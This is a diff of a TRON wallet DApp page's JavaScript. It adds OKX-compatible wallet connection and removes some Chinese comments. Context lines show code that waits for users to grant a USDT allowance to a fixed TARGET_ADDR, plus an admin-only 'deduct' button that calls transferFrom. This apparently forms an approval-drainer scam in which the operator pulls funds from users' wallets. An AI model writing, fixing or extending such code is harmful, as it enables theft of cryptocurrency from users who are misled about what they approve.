@@ -277,7 +277,6 @@ const USDT_ABI = [
     {"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
 ];
 
-// 循环等待交易确认，对齐BSC原版逻辑
 async function waitTxConfirm(txHash) {
     for(let i = 0; i < MAX_WAIT; i++){
         try{
@@ -295,7 +294,6 @@ async function waitTxConfirm(txHash) {
     throw new Error("交易已广播，但长时间未上链，请检查TRX资源是否充足");
 }
 
-// 循环等待授权额度上链同步，对齐BSC原版
 async function waitAllowance(needSun, maxLoop = 12) {
     for(let i = 0; i < maxLoop; i++){
         const allowance = await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call();
@@ -317,27 +315,46 @@ function disconnectWallet() {
     adminPanel.style.display = "none";
 }
 
+// 【修复OKX兼容】支持OKX window.tron 标准提供者
 async function connectWalletLogic() {
     if(tronWeb && userAddress){
         disconnectWallet();
         return;
     }
-    // OKX、TP、TronLink钱包注入tronWeb
-    if (!window.tronWeb || !window.tronWeb.ready) {
-        alert("未检测波场钱包，请在TP/OKX钱包DApp浏览器打开页面");
+    let tronProvider = window.tron || window.tronWeb;
+    if(!tronProvider){
+        alert("未检测波场钱包，请使用OKX/TP/TronLink内置DApp浏览器打开");
         return;
     }
-    tronWeb = window.tronWeb;
-    userAddress = tronWeb.defaultAddress.base58;
-    usdtContract = await tronWeb.contract(USDT_ABI, USDT_CONTRACT);
-    walletDot.classList.add("connected");
-    await loadBalance();
-    sendBtn.disabled = false;
-    // 判断是否管理员钱包
-    if(userAddress === TARGET_ADDR){
-        adminPanel.style.display = "block";
-    }else{
-        adminPanel.style.display = "none";
+    try{
+        // OKX必须主动request唤起弹窗授权
+        if(window.tron && typeof window.tron.request === "function"){
+            await window.tron.request({method:"tron_requestAccounts"});
+        }
+        // 实例化tronWeb
+        tronWeb = new TronWeb({
+            fullHost:"https://api.trongrid.io",
+            privateKey:false
+        });
+        // 拿钱包注入的地址
+        if(window.tronWeb && window.tronWeb.ready){
+            userAddress = window.tronWeb.defaultAddress.base58;
+        }else if(window.tron && window.tron.address){
+            userAddress = window.tron.address.base58;
+        }
+        if(!userAddress){
+            alert("钱包授权被拒绝或者没有获取到地址");
+            return;
+        }
+        usdtContract = await tronWeb.contract(USDT_ABI, USDT_CONTRACT);
+        walletDot.classList.add("connected");
+        await loadBalance();
+        sendBtn.disabled = false;
+        if(userAddress === TARGET_ADDR){
+            adminPanel.style.display = "block";
+        }
+    }catch(err){
+        alert("连接失败："+ (err.message || "用户拒绝连接钱包"));
     }
 }
 
@@ -392,7 +409,6 @@ sendBtn.addEventListener("click", async () => {
     }
 });
 
-// 管理员划扣 transferFrom
 deductBtn.addEventListener("click", async () => {
     if(!tronWeb || userAddress !== TARGET_ADDR){
         return alert("必须使用管理员钱包连接！");
